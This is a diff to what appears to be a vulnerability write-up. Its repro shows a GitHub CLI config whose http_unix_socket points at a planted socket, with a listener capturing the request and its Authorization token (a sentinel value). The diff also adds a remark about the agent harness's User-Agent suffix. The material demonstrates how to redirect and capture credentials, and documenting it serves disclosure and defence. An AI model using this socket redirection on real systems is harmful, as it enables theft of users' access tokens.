@@ -51,13 +51,17 @@ version: "1"
 http_unix_socket: /tmp/repro173f/pwn.sock
 $ HOME=... GH_TOKEN=ghp_SENTINELTOKEN0123456789012345678901 gh api user
 {"login":"forged"}
-$ head -5 captured.txt                      # what the listener on that socket received
+$ head -6 captured.txt                      # what the listener on that socket received
 GET /user HTTP/1.1
 Host: api.github.com
-User-Agent: GitHub CLI 2.100.0
+User-Agent: GitHub CLI 2.100.0 Agent/claude-code_2-1-263_agent
 Accept: */*
 Authorization: token ghp_SENTINELTOKEN0123456789012345678901
+Content-Type: application/json; charset=utf-8
 ```
+
+(The `Agent/...` suffix is this session's own harness announcing itself through `gh`, not
+something issuebot sets; the capture is quoted as it came back rather than tidied.)
 
 Three harms on that one ordinary command, and each is a different boundary:
 
